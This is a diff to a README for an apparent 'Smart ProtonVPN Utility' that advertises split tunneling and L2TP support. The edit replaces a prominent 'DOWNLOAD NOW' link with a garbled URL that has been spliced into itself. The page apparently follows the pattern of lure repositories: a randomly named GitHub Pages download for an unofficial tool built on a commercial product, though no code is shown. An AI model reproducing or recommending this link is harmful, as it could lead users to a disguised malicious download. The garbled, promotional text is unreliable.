@@ -4,7 +4,7 @@ Smart ProtonVPN Utility | split tunneling + L2TP support is the best ProtonVPN u
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthink.github.io/protonvpn-kz51/ ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthink.gihttps://foundtailorthink.github.io/protonvpn-kz51/thub.io/protonvpn-kz51/ ) |
  |---------------------|----------------------:|
 
 
